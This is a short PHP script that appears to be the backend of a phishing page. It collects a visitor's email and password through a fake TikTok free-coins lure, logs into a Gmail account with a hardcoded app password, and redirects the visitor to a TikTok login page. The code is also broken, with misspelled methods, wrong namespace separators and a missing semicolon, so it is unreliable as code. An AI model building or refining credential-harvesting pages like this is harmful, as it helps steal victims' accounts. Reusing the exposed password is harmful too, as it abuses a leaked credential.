<?php
use PHPMailer/PHPMailer/PHPMailer;
use PHPMailer/PHPMailer/Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

if(isset($_POST[""])){
   $mail = new PHPMailer(true);
   
   $mail->isSMTP();
   $mail->Host = 'smtp.gmail.com';
   $mail->SMTPAuth = 'true';
   $mail->Username = 'dresishack@gmail.com';
   $mail->Password = 'xlcj xqfg swxn zpes'
   $mail->SMTPSecure = 'ssl';
   $mail->Port = 465;
   
   $mail->setFrom('dresishack@gmail.com');
   
   $mail->addAddreas($_POST["email"]);
   
   $mail->isHTML(true);
   
   $mail->esail = $_POST["esail"];
   $mail->password_email = $_POST["password_email"];
   
   echo
   "
   <script>
   alert('SELAMAT COIN DI TRRIMA');
   document.location.href = 'Masuk dengan akun tiktok.html';
   </script>
   
   ";
}
?>